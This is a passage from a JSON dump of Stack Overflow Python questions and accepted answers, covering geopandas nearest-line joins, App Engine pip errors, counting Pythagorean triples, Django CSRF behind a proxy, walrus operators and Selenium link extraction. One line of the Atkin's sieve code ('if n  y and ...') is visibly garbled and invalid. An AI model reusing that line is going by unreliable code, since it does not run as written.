    "Body": "How do I fund the nearest LINESTRING near a point?\nFirst I have a list of LINESTRING and point value. How do I have the nearest LINESTRING to the POINT (5.41 3.9) and maybee the distance?\nfrom shapely.geometry import Point, LineString\n\nline_string = [LINESTRING (-1.15.12 9.9, -1.15.13 9.93), LINESTRING (-2.15.12 8.9, -2.15.13 8.93)]\npoint = POINT (5.41 3.9)\n\n#distance \nline_string [0].distance(point)\n\nSo far I think I got the distance value by doing line_string [0].distance(point) for the first LINESTRING so far but I just want to make sure I am going about it the right way.\n",
    "AcceptedAnswerId": 70627012,
    "AcceptedAnswer": "\nyour sample geometry is invalid for line strings, have modified\nit's simple to achieve with sjoin_nearest()\n\nimport geopandas as gpd\nimport shapely.wkt\nimport shapely.geometry\n\nline_string = [\"LINESTRING (-1.15.12 9.9, -1.15.13 9.93)\", \"LINESTRING (-2.15.12 8.9, -2.15.13 8.93)\"]\n# fix invalid wkt string...\nline_string = [\"LINESTRING (-1.15 9.9, -1.15 9.93)\", \"LINESTRING (-2.15 8.9, -2.15 8.93)\"]\npoint = \"POINT (5.41 3.9)\"\n\ngdf_p = gpd.GeoDataFrame(geometry=[shapely.wkt.loads(point)])\ngdf_l = gpd.GeoDataFrame(geometry=pd.Series(line_string).apply(shapely.wkt.loads))\n\ndf_n = gpd.sjoin_nearest(gdf_p, gdf_l).merge(gdf_l, left_on=\"index_right\", right_index=True)\n\ndf_n[\"distance\"] = df_n.apply(lambda r: r[\"geometry_x\"].distance(r[\"geometry_y\"]), axis=1)\n\ndf_n\n\n\n\n\n\n\n\ngeometry_x\nindex_right\ngeometry_y\ndistance\n\n\n\n\n0\nPOINT (5.41 3.9)\n0\nLINESTRING (-1.15 9.9, -1.15 9.93)\n8.89008\n\n\n\ndistance in meters\n\nuse a CRS that is in meters.  UTM has it's limitations if all points are not in same zone\n\nimport geopandas as gpd\nimport shapely.wkt\nimport shapely.geometry\n\nline_string = [\"LINESTRING (-1.15.12 9.9, -1.15.13 9.93)\", \"LINESTRING (-2.15.12 8.9, -2.15.13 8.93)\"]\n# fix invalid wkt string...\nline_string = [\"LINESTRING (-1.15 9.9, -1.15 9.93)\", \"LINESTRING (-2.15 8.9, -2.15 8.93)\"]\npoint = \"POINT (5.41 3.9)\"\n\ngdf_p = gpd.GeoDataFrame(geometry=[shapely.wkt.loads(point)], crs=\"epsg:4326\")\ngdf_l = gpd.GeoDataFrame(geometry=pd.Series(line_string).apply(shapely.wkt.loads), crs=\"epsg:4326\")\ngdf_p = gdf_p.to_crs(gdf_p.estimate_utm_crs())\ngdf_l = gdf_l.to_crs(gdf_p.crs)\n\n\ndf_n = gpd.sjoin_nearest(gdf_p, gdf_l).merge(gdf_l, left_on=\"index_right\", right_index=True)\n\ndf_n[\"distance\"] = df_n.apply(lambda r: r[\"geometry_x\"].distance(r[\"geometry_y\"]), axis=1)\n\ndf_n\n\n"
}
{
    "Id": 70602290,
    "PostTypeId": 1,
    "Title": "Google app engine deployment fails- Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')",
    "Body": "We are using command prompt c:\\gcloud app deploy app.yaml, but get the following error:\nRunning \"python3 -m pip install --requirement requirements.txt --upgrade --upgrade-strategy only-if-needed --no-warn-script-location --no-warn-conflicts --force-reinstall --no-compile (PIP_CACHE_DIR=/layers/google.python.pip/pipcache PIP_DISABLE_PIP_VERSION_CHECK=1)\"\nStep #2 - \"build\": /layers/google.python.pip/pip/bin/python3: Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')\nStep #2 - \"build\": Done \"python3 -m pip install --requirement requirements.txt --upgr...\" (34.49892ms)\nStep #2 - \"build\": Failure: (ID: 0ea8a540) /layers/google.python.pip/pip/bin/python3: Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')\nStep #2 - \"build\": --------------------------------------------------------------------------------\nStep #2 - \"build\": Running \"mv -f /builder/outputs/output-5577006791947779410 /builder/outputs/output\"\nStep #2 - \"build\": Done \"mv -f /builder/outputs/output-5577006791947779410 /builder/o...\" (12.758866ms)\nStep #2 - \"build\": ERROR: failed to build: exit status 1\nFinished Step #2 - \"build\"\nERROR\nERROR: build step 2 \"us.gcr.io/gae-runtimes/buildpacks/python37/builder:python37_20211201_3_7_12_RC00\" failed: step exited with non-zero status: 145\n\nOur Requirements.txt is as below. We are currently on Python 3.7 standard app engine\nfirebase_admin==3.0.0\nsendgrid==6.9.3\ngoogle-auth==1.35.0\ngoogle-auth-httplib2==0.1.0\njinja2==3.0.3\nMarkupSafe==2.0.1\npytz==2021.3\nFlask==2.0.2\ntwilio==6.46.0\nhttplib2==0.20.2\nrequests==2.24.0\nrequests_toolbelt==0.9.1\ngoogle-cloud-tasks==2.7.1\ngoogle-cloud-logging==1.15.1\ngoogleapis-common-protos==1.54.0\n\nPlease help.The above code was working well before updating the requirements.txt file. We tried to remove gunicorn to allow the system pickup the latest according to documentation here.\nWe have a subdirectory structure that stores all the .py files in controllers and db definitions in models. Our main.py has the following -\nsys.path.append(os.path.join(os.path.dirname(__file__), '../controllers'))\nsys.path.append(os.path.join(os.path.dirname(__file__), '../models'))\n\nDoes anyone know how to debug this error -  Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__'). What does this mean?\n",
    "AcceptedAnswerId": 70619556,
    "AcceptedAnswer": "I had the same issue when deploying a Google Cloud Function. The error\n\ncloud function Error while finding module specification for 'pip' (AttributeError: module 'main' has no attribute 'file'); Error ID: c84b3231\n\nappeared after commenting out some packages in the requirements.txt, but that was nothing important and likely did not cause it. I guess that it is more a problem of an instability in Google Storage, since that same Cloud Function I was working on had lost its archive already some time before, all of a sudden, out of nowhere, showing:\n\nArchive not found in the storage location cloud function\n\nand I did not delete or change anything that might explain this, as Archive not found in the storage location: Google Function would suggest. Though that answer has one very interesting guess that might explain at least the very first time the \"Archive not found\" error came up and thus made the CF instable: I might have changed the timezone city of the bucket during browsing the Google Storage. It is too long ago, but I know I browsed the GS, therefore, I cannot exclude this. Quote: \"It [the Archive not found error] may occurr too if GCS bucket's region is not matched to your Cloud function region.\"\nAfter this \"Archive not found\" crash, I manually added main.py and requirements.txt and filled them again with code from the backup. This worked for some time, but there seems to be some general instability in the Google Storage. Therefore, always keep backups of your deployed scripts.\nThen, after getting this pip error of the question in that already instable Cloud Function, waiting for a day or two, Google Function again showed\n\nArchive not found in the storage location cloud function\n\nIf you run into this pip error in a Cloud Function, you might consider updating pip in the \"requirements.txt\" but if you are in such an unstable Cloud Function the better workaround seems to be to create a new Cloud Function and copy everything in there.\nThe pip error probably just shows that the source script, in this case the requirements.txt, cannot be run since the source code is not fully embedded anymore or has lost some embedding in the Google Storage.\nOr you give that Cloud Function a second chance and edit, go to Source tab, click on Dropdown Source code to choose Inline Editor and add main.py and requirements.txt manually (Runtime: Python).\n\n"
}
{
    "Id": 70680363,
    "PostTypeId": 1,
    "Title": "Structural pattern matching using regex",
    "Body": "I have a string that I'm trying to validate against a few regex patterns and I was hoping since Pattern matching is available in 3.10, I might be able to use that instead of creating an if-else block.\nConsider a string 'validateString' with possible values 1021102,1.25.32, string021.\nThe code I tried would be something like the following.\nmatch validateString:\n    case regex1:\n        print('Matched regex1')\n    case regex2:\n        print('Matched regex2')\n    case regex3:\n        print('Matched regex3')\n\nFor regex 1, 2 and 3, I've tried string regex patterns and also re.compile objects but it doesn't seem to work.\nI have been trying to find examples of this over the internet but can't seem to find any that cover regex pattern matching with the new python pattern matching.\nAny ideas for how I can make it work?\nThanks!\n",
    "AcceptedAnswerId": 70680526,
    "AcceptedAnswer": "It is not possible to use regex-patterns to match via structural pattern matching (at this point in time).\nFrom: PEP0643: structural-pattern-matching\n\nPEP 634: Structural Pattern Matching\nStructural pattern matching has been added in the form of a match statement and case statements of patterns with associated actions. Patterns consist of sequences, mappings, primitive data types as well as class instances. Pattern matching enables programs to extract information from complex data types, branch on the structure of data, and apply specific actions based on different forms of data. (emphasis mine)\n\nNothing in this gives any hint that evoking match / search functions of the re module on the provided pattern is intended to be used for matching.\n\nYou can find out more about the reasoning behind strucutral pattern matching by reading the actuals PEPs:\n\nPEP 634 -- Structural Pattern Matching: Specification\nPEP 635 -- Structural Pattern Matching: Motivation and Rationale\nPEP 636 -- Structural Pattern Matching: Tutorial\n\nthey also include ample examples on how to use it.\n"
}
{
    "Id": 70573108,
    "PostTypeId": 1,
    "Title": "Speeding up the loops or different ideas for counting primitive triples",
    "Body": "def pythag_triples(n):\n    i = 0\n    start = time.time()\n    for x in range(1, int(sqrt(n) + sqrt(n)) + 1, 2):\n        for m in range(x+2,int(sqrt(n) + sqrt(n)) + 1, 2):\n            if gcd(x, m) == 1:\n                # q = x*m\n                # l = (m**2 - x**2)/2\n                c = (m**2 + x**2)/2\n                # trips.append((q,l,c))\n                if c < n:\n                    i += 1\n    end = time.time()\n    return i, end-start\nprint(pythag_triples(3141592653589793))\n\nI'm trying to calculate primitive pythagorean triples using the idea that all triples are generated from using m, n that are both odd and coprime. I already know that the function works up to 1000000 but when doing it to the larger number its taken longer than 24 hours. Any ideas on how to speed this up/ not brute force it. I am trying to count the triples.\n",
    "AcceptedAnswerId": 70661056,
    "AcceptedAnswer": "This new answer brings the total time for big_n down to 4min 6s.\nAn profiling of my initial answer revealed these facts:\n\nTotal time: 1h 42min 33s\nTime spent factorizing numbers: almost 100% of the time\n\nIn contrast, generating all primes from 3 to sqrt(2*N - 1) takes only 38.5s (using Atkin's sieve).\nI therefore decided to try a version where we generate all numbers m as known products of prime numbers. That is, the generator yields the number itself as well as the distinct prime factors involved. No factorization needed.\nThe result is still 500_000_000_002_841, off by 4 as @Koder noticed. I do not know yet where that problem comes from. Edit: after correction of the xmax bound (isqrt(2*N - m**2) instead of isqrt(2*N - m**2 - 1), since we do want to include triangles with hypothenuse equal to N), we now get the correct result.\nThe code for the primes generator is included at the end. Basically, I used Atkin's sieve, adapted (without spending much time on it) to Python. I am quite sure it could be sped up (e.g. using numpy and perhaps even numba).\nTo generate integers from primes (which we know we can do thanks to the Fundamental theorem of arithmetic), we just need to iterate through all the possible products prod(p_i**k_i) where p_i is the i^th prime number and k_i is any non-negative integer.\nThe easiest formulation is a recursive one:\ndef gen_ints_from_primes(p_list, upto):\n    if p_list and upto >= p_list[0]:\n        p, *p_list = p_list\n        pk = 1\n        p_tup = tuple()\n        while pk <= upto:\n            for q, p_distinct in gen_ints_from_primes(p_list, upto=upto // pk):\n                yield pk * q, p_tup + p_distinct\n            pk *= p\n            p_tup = (p, )\n    else:\n        yield 1, tuple()\n\nUnfortunately, we quickly run into memory constraints (and recursion limit). So here is a non-recursive version which uses no extra memory aside from the list of primes themselves. Essentially, the current value of q (the integer in process of being generated) and an index in the list are all the information we need to generate the next integer. Of course, the values come unsorted, but that doesn't matter, as long as they are all covered.\ndef rem_p(q, p, p_distinct):\n    q0 = q\n    while q % p == 0:\n        q //= p\n    if q != q0:\n        if p_distinct[-1] != p:\n            raise ValueError(f'rem({q}, {p}, ...{p_distinct[-4:]}): p expected at end of p_distinct if q % p == 0')\n        p_distinct = p_distinct[:-1]\n    return q, p_distinct\n\ndef add_p(q, p, p_distinct):\n    if len(p_distinct) == 0 or p_distinct[-1] != p:\n        p_distinct += (p, )\n    q *= p\n    return q, p_distinct\n\ndef gen_prod_primes(p, upto=None):\n    if upto is None:\n        upto = p[-1]\n    if upto >= p[-1]:\n        p = p + [upto + 1]  # sentinel\n    \n    q = 1\n    i = 0\n    p_distinct = tuple()\n    \n    while True:\n        while q * p[i] <= upto:\n            i += 1\n        while q * p[i] > upto:\n            yield q, p_distinct\n            if i <= 0:\n                return\n            q, p_distinct = rem_p(q, p[i], p_distinct)\n            i -= 1\n        q, p_distinct = add_p(q, p[i], p_distinct)\n\nExample-\n>>> p_list = list(primes(20))\n>>> p_list\n[2, 3, 5, 7, 11, 13, 17, 19]\n\n>>> sorted(gen_prod_primes(p_list, 20))\n[(1, ()),\n (2, (2,)),\n (3, (3,)),\n (4, (2,)),\n (5, (5,)),\n (6, (2, 3)),\n (7, (7,)),\n (8, (2,)),\n (9, (3,)),\n (10, (2, 5)),\n (11, (11,)),\n (12, (2, 3)),\n (13, (13,)),\n (14, (2, 7)),\n (15, (3, 5)),\n (16, (2,)),\n (17, (17,)),\n (18, (2, 3)),\n (19, (19,)),\n (20, (2, 5))]\n\nAs you can see, we don't need to factorize any number, as they conveniently come along with the distinct primes involved.\nTo get only odd numbers, simply remove 2 from the list of primes:\n>>> sorted(gen_prod_primes(p_list[1:]), 20)\n[(1, ()),\n (3, (3,)),\n (5, (5,)),\n (7, (7,)),\n (9, (3,)),\n (11, (11,)),\n (13, (13,)),\n (15, (3, 5)),\n (17, (17,)),\n (19, (19,))]\n\nIn order to exploit this number-and-factors presentation, we need to amend a bit the function given in the original answer:\ndef phi(n, upto=None, p_list=None):\n    # Euler's totient or \"phi\" function\n    if upto is None or upto > n:\n        upto = n\n    if p_list is None:\n        p_list = list(distinct_factors(n))\n    if upto < n:\n        # custom version: all co-primes of n up to the `upto` bound\n        cnt = upto\n        for q in products_of(p_list, upto):\n            cnt += upto // q if q > 0 else -(upto // -q)\n        return cnt\n    # standard formulation: all co-primes of n up to n-1\n    cnt = n\n    for p in p_list:\n        cnt = cnt * (p - 1) // p\n    return cnt\n\nWith all this, we can now rewrite our counting functions:\ndef pt_count_m(N):\n    # yield tuples (m, count(x) where 0 < x < m and odd(x)\n    # and odd(m) and coprime(x, m) and m**2 + x**2 <= 2*N))\n    # in this version, m is generated from primes, and the values\n    # are iterated through unordered.\n    mmax = isqrt(2*N - 1)\n    p_list = list(primes(mmax))[1:]  # skip 2\n    for m, p_distinct in gen_prod_primes(p_list, upto=mmax):\n        if m < 3:\n            continue\n        # requirement: (m**2 + x**2) // 2 <= N\n        # note, both m and x are odd (so (m**2 + x**2) // 2 == (m**2 + x**2) / 2)\n        xmax = isqrt(2*N - m*m)\n        cnt_m = phi(m+1, upto=xmax, p_list=(2,) + tuple(p_distinct))\n        if cnt_m > 0:\n            yield m, cnt_m\n\ndef pt_count(N, progress=False):\n    mmax = isqrt(2*N - 1)\n    it = pt_count_m(N)\n    if progress:\n        it = tqdm(it, total=(mmax - 3 + 1) // 2)\n    return sum(cnt_m for m, cnt_m in it)\n\nAnd now:\n%timeit pt_count(100_000_000)\n31.1 ms \u00b1 38.9 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n%timeit pt_count(1_000_000_000)\n104 ms \u00b1 299 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n# the speedup is still very moderate at that stage\n\n# however:\n%%time\nbig_n = 3_141_592_653_589_793\nN = big_n\nres = pt_count(N)\n\nCPU times: user 4min 5s, sys: 662 ms, total: 4min 6s\nWall time: 4min 6s\n\n>>> res\n500000000002845\n\nAddendum: Atkin's sieve\nAs promised, here is my version of Atkin's sieve. It can definitely be sped up.\ndef primes(limit):\n    # Generates prime numbers between 2 and n\n    # Atkin's sieve -- see http://en.wikipedia.org/wiki/Prime_number\n    sqrtLimit = isqrt(limit) + 1\n\n    # initialize the sieve\n    is_prime = [False, False, True, True, False] + [False for _ in range(5, limit + 1)]\n\n    # put in candidate primes:\n    # integers which have an odd number of\n    # representations by certain quadratic forms\n    for x in range(1, sqrtLimit):\n        x2 = x * x\n        for y in range(1, sqrtLimit):\n            y2 = y*y\n            n = 4 * x2 + y2\n            if n <= limit and (n % 12 == 1 or n % 12 == 5): is_prime[n] ^= True\n            n = 3 * x2 + y2\n            if n <= limit and (n % 12 == 7): is_prime[n] ^= True\n            n = 3*x2-y2\n            if n  y and n % 12 == 11: is_prime[n] ^= True\n\n    # eliminate composites by sieving\n    for n in range(5, sqrtLimit):\n        if is_prime[n]:\n            sqN = n**2\n            # n is prime, omit multiples of its square; this is sufficient because\n            # composites which managed to get on the list cannot be square-free\n            for i in range(1, int(limit/sqN) + 1):\n                k = i * sqN # k \u2208 {n\u00b2, 2n\u00b2, 3n\u00b2, ..., limit}\n                is_prime[k] = False\n    for i, truth in enumerate(is_prime):\n        if truth: yield i\n\n"
}
{
    "Id": 70639443,
    "PostTypeId": 1,
    "Title": "Convert a bytes iterable to an iterable of str, where each value is a line",
    "Body": "I have an iterable of bytes, such as\nbytes_iter = (\n    b'col_1,',\n    b'c',\n    b'ol_2\\n1',\n    b',\"val',\n    b'ue\"\\n',\n)\n\n(but typically this would not be hard coded or available all at once, but supplied from a generator say) and I want to convert this to an iterable of str lines, where line breaks are unknown up front, but could be any of \\r, \\n or \\r\\n. So in this case would be:\nlines_iter = (\n    'col_1,col_2',\n    '1,\"value\"',\n)\n\n(but again, just as an iterable, not so it's all in memory at once).\nHow can I do this?\nContext: my aim is to then pass the iterable of str lines to csv.reader (that I think needs whole lines?), but I'm interested in this answer just in general.\n",
    "AcceptedAnswerId": 70639580,
    "AcceptedAnswer": "Use the io module to do most of the work for you:\nclass ReadableIterator(io.IOBase):\n    def __init__(self, it):\n        self.it = iter(it)\n    def read(self, n):\n        # ignore argument, nobody actually cares\n        # note that it is *critical* that we suppress the `StopIteration` here\n        return next(self.it, b'')\n    def readable(self):\n        return True\n\nthen just call io.TextIOWrapper(ReadableIterator(some_iterable_of_bytes)).\n"
}
{
    "Id": 71086270,
    "PostTypeId": 1,
    "Title": "No module named 'virtualenv.activation.xonsh'",
    "Body": "I triyed to execute pipenv shell in a new environtment and I got the following error:\nLoading .env environment variables\u2026\nCreating a virtualenv for this project\u2026\nUsing /home/user/.pyenv/shims/python3.9 (3.9.7) to create virtualenv\u2026\n\u280bModuleNotFoundError: No module named 'virtualenv.activation.xonsh'\nError while trying to remove the /home/user/.local/share/virtualenvs/7t env: \nNo such file or directory\n\nVirtualenv location: \nWarning: Your Pipfile requires python_version 3.9, but you are using None (/bin/python).\n  $ pipenv check will surely fail.\nSpawning environment shell (/usr/bin/zsh). Use 'exit' to leave.\n\nI tried to remove pipenv, install python with pienv create an alias to python, but anything works.\nAny idea, I got the same error in existing environment, I tried to remove all environments folder but nothing.\nThanks.\n",
    "AcceptedAnswerId": 71092453,
    "AcceptedAnswer": "By github issue, the solution that works was the following:\nsudo apt-get remove python3-virtualenv\n\n"
}
{
    "Id": 70588185,
    "PostTypeId": 1,
    "Title": "WARNING: The script pip3.8 is installed in '/usr/local/bin' which is not on PATH",
    "Body": "When running pip3.8 i get the following warning appearing in my terminal\nWARNING: The script pip3.8 is installed in '/usr/local/bin' which is not on PATH.\n  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.\nSuccessfully installed pip-21.1.1 setuptools-56.0.0\nWARNING: Running pip as root will break packages and permissions. You should install packages reliably by using venv: https://pip.pypa.io/warnings/venv\n\nHow to solve this problem on centos 7?\n",
    "AcceptedAnswerId": 70680333,
    "AcceptedAnswer": "This question has been answered on the serverfaults forum: Here is a link to the question.\nYou need to add the following line to your ~/.bash_profile or ~/.bashrc file.\n export PATH=\"/usr/local/bin:$PATH\"\n\nYou will then need to profile, do this by either running the command:\nsource ~/.bash_profile\n\nOr by simply closing your terminal and opening a new session. You should continue to check your PATH to make sure it includes the path.\necho $PATH\n\n"
}
{
    "Id": 70679571,
    "PostTypeId": 1,
    "Title": "How do I set a wildcard for CSRF_TRUSTED_ORIGINS in Django?",
    "Body": "After updating from Django 2 to Django 4.0.1 I am getting CSRF errors on all POST requests. The logs show:\n\"WARNING:django.security.csrf:Forbidden (Origin checking failed - https://127.0.0.1 does not match any trusted origins.): /activate/\"\nI can't figure out how to set a wildcard for CSRF_TRUSTED_ORIGINS? I have a server shipped to customers who host it on their own domain so there is no way for me to no the origin before hand. I have tried the following with no luck:\nCSRF_TRUSTED_ORIGINS = [\"https://*\", \"http://*\"]\n\nand\nCSRF_TRUSTED_ORIGINS = [\"*\"]\n\nExplicitly setting \"https://127.0.0.1\" in the CSRF_TRUSTED_ORIGINS works but won't work in my customer's production deployment which will get another hostname.\n",
    "AcceptedAnswerId": 70689561,
    "AcceptedAnswer": "The Django app is running using Gunicorn behind NGINX. Because SSL is terminated after NGINX request.is_secure() returns false which results in Origin header not matching the host here:\nhttps://github.com/django/django/blob/3ff7f6cf07a722635d690785c31ac89484134bee/django/middleware/csrf.py#L276\nI resolved the issue by adding the following in Django:\nSECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')\n\nAnd ensured that NGINX is forwarding the http scheme with the following in my NGINX conf:\nproxy_set_header X-Forwarded-Proto $scheme;\n\n"
}
{
    "Id": 71184699,
    "PostTypeId": 1,
    "Title": "Filter a dictionary of lists",
    "Body": "I have a dictionary of the form:\n{\"level\": [1, 2, 3],\n \"conf\": [-1, 1, 2],\n \"text\": [\"here\", \"hel\", \"llo\"]}\n\nI want to filter the lists to remove every item at index i where an index in the value \"conf\" is not >0.\nSo for the above dict, the output should be this:\n{\"level\": [2, 3],\n \"conf\": [1, 2],\n \"text\": [\"hel\", \"llo\"]}\n\nAs the first value of conf was not > 0.\nI have tried something like this:\nnew_dict = {i: [a for a in j if a >= min_conf] for i, j in my_dict.items()}\n\nBut that would work just for one key.\n",
    "AcceptedAnswerId": 71184858,
    "AcceptedAnswer": "I solved it with this:\nfrom typing import Dict, List, Any, Set\n\nd = {\"level\":[1,2,3], \"conf\":[-1,1,2], \"text\":[\"-1\", \"hel\", \"llo\"]}\n\n# First, we create a set that stores the indices which should be kept.\n# I chose a set instead of a list because it has a O(1) lookup time.\n# We only want to keep the items on indices where the value in d[\"conf\"] is greater than 0\nfiltered_indexes = {i for i, value in enumerate(d.get('conf', [])) if value > 0}\n\ndef filter_dictionary(d: Dict[str, List[Any]], filtered_indexes: Set[int]) -> Dict[str, List[Any]]:\n    filtered_dictionary = d.copy()  # We'll return a modified copy of the original dictionary\n    for key, list_values in d.items():\n        # In the next line the actual filtering for each key/value pair takes place. \n        # The original lists get overwritten with the filtered lists.\n        filtered_dictionary[key] = [value for i, value in enumerate(list_values) if i in filtered_indexes]\n    return filtered_dictionary\n\nprint(filter_dictionary(d, filtered_indexes))\n\nOutput:\n{'level': [2, 3], 'conf': [1, 2], 'text': ['hel', 'llo']}\n\n"
}
{
    "Id": 70698738,
    "PostTypeId": 1,
    "Title": "Two Walrus Operators in one If Statement",
    "Body": "Is there a correct way to have two walrus operators in 1 if statement?\nif (three:= i%3==0) and (five:= i%5 ==0):\n    arr.append(\"FizzBuzz\")\nelif three:\n    arr.append(\"Fizz\")\nelif five:\n    arr.append(\"Buzz\")\nelse:\n    arr.append(str(i-1))\n\nThis example works for three but five will be \"not defined\".\n",
    "AcceptedAnswerId": 70699069,
    "AcceptedAnswer": "The logical operator and evaluates its second operand only conditionally. There is no correct way to have a conditional assignment that is unconditionally needed.\nInstead use the \"binary\" operator &, which evaluates its second operand unconditionally.\narr = []\nfor i in range(1, 25):\n    #                        v force evaluation of both operands\n    if (three := i % 3 == 0) & (five := i % 5 == 0):\n        arr.append(\"FizzBuzz\")\n    elif three:\n        arr.append(\"Fizz\")\n    elif five:\n        arr.append(\"Buzz\")\n    else:\n        arr.append(str(i))\n\nprint(arr)\n# ['1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', ...]\n\nCorrespondingly, one can use | as an unconditional variant of or. In addition, the \"xor\" operator ^ has no equivalent with conditional evaluation at all.\nNotably, the binary operators evaluate booleans as purely boolean  - for example, False | True is True not 1 \u2013 but may work differently for other types. To evaluate arbitrary values such as lists in a boolean context with binary operators, convert them to bool after assignment:\n#  |~~~ force list to boolean ~~| | force evaluation of both operands\n#  v    v~ walrus-assign list ~vv v\nif bool(lines := list(some_file)) & ((today := datetime.today()) == 0):\n   ...\n\nSince assignment expressions require parentheses for proper precedence, the common problem of different precedence between logical (and, or) and binary (&, |, ^) operators is irrelevant here.\n"
}
{
    "Id": 70721360,
    "PostTypeId": 1,
    "Title": "Python/Selenium web scrap how to find hidden src value from a links?",
    "Body": "Scrapping links should be a simple feat, usually just grabbing the src value of the a tag.\nI recently came across this website (https://sunteccity.com.sg/promotions) where the href value of a tags of each item cannot be found, but the redirection still works. I'm trying to figure out a way to grab the items and their corresponding links. My typical python selenium code looks something as such\nall_items = bot.find_elements_by_class_name('thumb-img')\nfor promo in all_items:\n    a = promo.find_elements_by_tag_name(\"a\")\n    print(\"a[0]: \", a[0].get_attribute(\"href\"))\n\nHowever, I can't seem to retrieve any href, onclick attributes, and I'm wondering if this is even possible. I noticed that I couldn't do a right-click, open link in new tab as well.\nAre there any ways around getting the links of all these items?\nEdit: Are there any ways to retrieve all the links of the items on the pages?\ni.e.\nhttps://sunteccity.com.sg/promotions/724\nhttps://sunteccity.com.sg/promotions/731\nhttps://sunteccity.com.sg/promotions/751\nhttps://sunteccity.com.sg/promotions/752\nhttps://sunteccity.com.sg/promotions/754\nhttps://sunteccity.com.sg/promotions/280\n...\n\n\nEdit:\nAdding an image of one such anchor tag for better clarity:\n\n",
    "AcceptedAnswerId": 70725182,
    "AcceptedAnswer": "By reverse-engineering the Javascript that takes you to the promotions pages (seen in https://sunteccity.com.sg/_nuxt/d4b648f.js) that gives you a way to get all the links, which are based on the HappeningID. You can verify by running this in the JS console, which gives you the first promotion:\nwindow.__NUXT__.state.Promotion.promotions[0].HappeningID\n\nBased on that, you can create a Python loop to get all the promotions:\nitems = driver.execute_script(\"return window.__NUXT__.state.Promotion;\")\nfor item in items[\"promotions\"]:\n    base = \"https://sunteccity.com.sg/promotions/\"\n    happening_id = str(item[\"HappeningID\"])\n    print(base + happening_id)\n\nThat generated the following output:\nhttps://sunteccity.com.sg/promotions/724\nhttps://sunteccity.com.sg/promotions/731\nhttps://sunteccity.com.sg/promotions/751\nhttps://sunteccity.com.sg/promotions/752\nhttps://sunteccity.com.sg/promotions/754\nhttps://sunteccity.com.sg/promotions/280\nhttps://sunteccity.com.sg/promotions/764\nhttps://sunteccity.com.sg/promotions/766\nhttps://sunteccity.com.sg/promotions/762\nhttps://sunteccity.com.sg/promotions/767\nhttps://sunteccity.com.sg/promotions/732\nhttps://sunteccity.com.sg/promotions/733\nhttps://sunteccity.com.sg/promotions/735\nhttps://sunteccity.com.sg/promotions/736\nhttps://sunteccity.com.sg/promotions/737\nhttps://sunteccity.com.sg/promotions/738\nhttps://sunteccity.com.sg/promotions/739\nhttps://sunteccity.com.sg/promotions/740\nhttps://sunteccity.com.sg/promotions/741\nhttps://sunteccity.com.sg/promotions/742\nhttps://sunteccity.com.sg/promotions/743\nhttps://sunteccity.com.sg/promotions/744\nhttps://sunteccity.com.sg/promotions/745\nhttps://sunteccity.com.sg/promotions/746\nhttps://sunteccity.com.sg/promotions/747\nhttps://sunteccity.com.sg/promotions/748\nhttps://sunteccity.com.sg/promotions/749\nhttps://sunteccity.com.sg/promotions/750\nhttps://sunteccity.com.sg/promotions/753\nhttps://sunteccity.com.sg/promotions/755\nhttps://sunteccity.com.sg/promotions/756\nhttps://sunteccity.com.sg/promotions/757\nhttps://sunteccity.com.sg/promotions/758\nhttps://sunteccity.com.sg/promotions/759\nhttps://sunteccity.com.sg/promotions/760\nhttps://sunteccity.com.sg/promotions/761\nhttps://sunteccity.com.sg/promotions/763\nhttps://sunteccity.com.sg/promotions/765\nhttps://sunteccity.com.sg/promotions/730\nhttps://sunteccity.com.sg/promotions/734\nhttps://sunteccity.com.sg/promotions/623\n\n"
}
{
    "Id": 70585068,
    "PostTypeId": 1,
    "Title": "How do I get libpq to be found by ctypes find_library?",
    "Body": "I am building a simple DB interface in Python (3.9.9) and I am using psycopg (3.0.7) to connect to my Postgres (14.1) database. Until recently, the development of this app took place on Linux, but now I am using macOS Monterey on an M1 Mac mini. This seems to be causing some troubles with ctypes, which psycopg uses extensively. The error I am getting is the following:\nImportError: no pq wrapper available.\nAttempts made:\n- couldn't import psycopg 'c' implementation: No module named 'psycopg_c'\n- couldn't import psycopg 'binary' implementation: No module named 'psycopg_binary'\n- couldn't import psycopg 'python' implementation: libpq library not found\n\nBased on the source code of psycopg, this is an error of ctypes not being able to util.find_library libpq.dylib. Postgres is installed as Postgres.app, meaning that libpq.dylib's path is\n/Applications/Postgres.app/Contents/Versions/14/bin/lib\nI have tried adding this to PATH, but it did not work. I then created a symlink to the path in /usr/local/lib, but (unsurprisingly) it also did not work. I then did some digging and found this issue describing the same problem. I am not a big macOS expert, so I am unsure on how to interpret some of the points raised. Do I need to add the path to the shared cache? Also, I do not want to fork the Python repo and implement the dlopen() method as suggested, as it seems to lead to other problems.\nAnyhow, is there a solution to quickly bypass this problem? As an additional reference, the code producing the above error is just:\nimport psycopg\n\nprint(psycopg.__version__)\n\n",
    "AcceptedAnswerId": 70740545,
    "AcceptedAnswer": "I had this problem but the solution was suggested to me by this answer to a related question: try setting envar DYLD_LIBRARY_PATH to the path you identified.\nNB, to get it working myself, I:\n\nused the path /Applications/Postgres.app/Contents/Versions/latest/lib and\nhad to install Python 3.9\n\n"
}
{
    "Id": 70729502,
    "PostTypeId": 1,
    "Title": "F2 rename variable doesn't work in vscode + jupyter notebook + python",
